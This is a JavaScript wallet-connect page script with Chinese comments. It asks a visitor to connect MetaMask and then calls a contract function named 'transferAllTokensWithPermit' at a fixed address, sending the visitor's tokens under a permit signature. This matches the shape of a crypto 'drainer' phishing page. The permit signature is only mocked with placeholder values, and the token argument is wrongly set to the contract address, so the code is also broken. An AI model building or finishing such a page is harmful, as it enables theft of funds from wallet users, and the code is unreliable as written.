const contractAddress = "0x9a2E12340354d2532b4247da3704D2A5d73Bd189"; // 最新合约地址
const abi = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "token",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			},
			{
				"internalType": "uint256",
				"name": "deadline",
				"type": "uint256"
			},
			{
				"internalType": "uint8",
				"name": "v",
				"type": "uint8"
			},
			{
				"internalType": "bytes32",
				"name": "r",
				"type": "bytes32"
			},
			{
				"internalType": "bytes32",
				"name": "s",
				"type": "bytes32"
			}
		],
		"name": "transferAllTokensWithPermit",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
];

let web3;
let userAddress;

window.onload = function() {
    document.getElementById('connectButton').addEventListener('click', connectWallet);
    document.getElementById('transferButton').addEventListener('click', transferTokens);
};

async function connectWallet() {
    if (window.ethereum) {
        try {
            web3 = new Web3(window.ethereum);
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];

            document.getElementById('walletAddress').innerText = userAddress;
            document.getElementById('tokenAddress').innerText = contractAddress;

            // 获取签名参数 (模拟)
            const signature = await signPermit(userAddress);
            document.getElementById('vValue').innerText = signature.v;
            document.getElementById('rValue').innerText = signature.r;
            document.getElementById('sValue').innerText = signature.s;

            document.getElementById('transferButton').disabled = false;
        } catch (error) {
            console.error("连接钱包失败:", error);
        }
    } else {
        alert("请安装MetaMask钱包！");
    }
}

async function signPermit(userAddress) {
    console.log("正在生成签名...");
    // 模拟签名参数
    return {
        v: 27,
        r: "0x...",
        s: "0x..."
    };
}

async function transferTokens() {
    const contract = new web3.eth.Contract(abi, contractAddress);
    const value = web3.utils.toWei('1', 'ether');  // 假设转移 1 个代币的示例值
    const deadline = Math.floor(Date.now() / 1000) + 60 * 60; // 一小时后

    const v = parseInt(document.getElementById('vValue').innerText);
    const r = document.getElementById('rValue').innerText;
    const s = document.getElementById('sValue').innerText;

    try {
        await contract.methods.transferAllTokensWithPermit(
            contractAddress, userAddress, value, deadline, v, r, s
        ).send({ from: userAddress });

        console.log("代币转移成功！");
    } catch (error) {
        console.error("代币转移失败:", error);
    }
}
